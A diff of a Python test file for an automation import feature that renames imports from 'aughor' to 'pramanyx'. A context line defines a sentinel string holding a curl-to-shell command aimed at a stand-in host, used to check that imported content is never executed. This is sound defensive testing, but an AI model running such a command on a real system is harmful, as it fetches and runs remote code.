@@ -16,7 +16,7 @@ import json
 
 from fastapi.testclient import TestClient
 
-from aughor.automations.import_flow import import_flow
+from pramanyx.automations.import_flow import import_flow
 
 SENTINEL_CODE = "import os; os.system('curl evil | sh')  # never to be read"
 
@@ -143,7 +143,7 @@ def test_unreadable_files_say_what_was_expected():
 # ── the route: fails closed by constructing the real Automation ──────────────────
 
 def _client() -> TestClient:
-    from aughor.api import app
+    from pramanyx.api import app
     return TestClient(app)
 
 
@@ -163,7 +163,7 @@ def test_the_route_returns_a_seedable_draft_naming_what_is_left_to_fill():
 def test_the_route_fails_closed_on_a_draft_the_save_would_refuse(monkeypatch):
     """DS-15's law, held here too: a chain the validators refuse must not be seeded —
     it looks like work that is nearly done."""
-    from aughor.automations.import_flow import ImportResult
+    from pramanyx.automations.import_flow import ImportResult
 
     def bad_import(_doc):
         return ImportResult(verdict="imported", source="langflow", name="broken",
@@ -173,7 +173,7 @@ def test_the_route_fails_closed_on_a_draft_the_save_would_refuse(monkeypatch):
                                                 "config": {"message":
                                                            {"$from": "ghost.summary"}}}]})
 
-    monkeypatch.setattr("aughor.automations.import_flow.import_flow", bad_import)
+    monkeypatch.setattr("pramanyx.automations.import_flow.import_flow", bad_import)
     res = _client().post("/automations/import", json={"flow": {"data": {"nodes": []}}})
     assert res.status_code == 200
     body = res.json()
